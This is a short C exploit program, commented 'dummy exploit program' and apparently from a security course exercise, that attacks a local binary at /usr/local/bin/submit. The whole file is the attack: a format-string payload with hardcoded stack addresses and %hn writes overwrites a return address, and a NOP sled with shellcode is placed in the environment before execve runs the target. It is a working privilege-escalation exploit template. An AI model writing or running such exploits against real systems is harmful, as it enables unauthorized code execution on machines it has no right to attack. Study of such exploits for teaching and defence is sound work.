/*
 * dummy exploit program
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/usr/local/bin/submit"
#define FORMATSTRING "\x6c\xdc\xbf\xff\x6e\xdc\xbf\xff%56824x%17$hn%8607x%18$hn"

int main( void )
{

  char fileinput[ 300 ];
  char *args[ 4 ];
  long *a;
  char *env[ 1 ];
  int j;
  long *retaddr = ( long * ) 0xffbfdf00;
  int i = strlen( shellcode );
  memset( fileinput, 0x90, 300 );

  
  a = fileinput + 200;
  
  memcpy( a, shellcode, i );
  
  args[ 0 ] = FORMATSTRING; args[ 1 ] = "-v";
  args[ 2 ] = NULL; args[ 3 ] = NULL;

  env[ 0 ] = fileinput;

  if ( execve( TARGET, args, env ) < 0 )
    fprintf( stderr, "execve failed.\n" );

  exit( 0 );
}
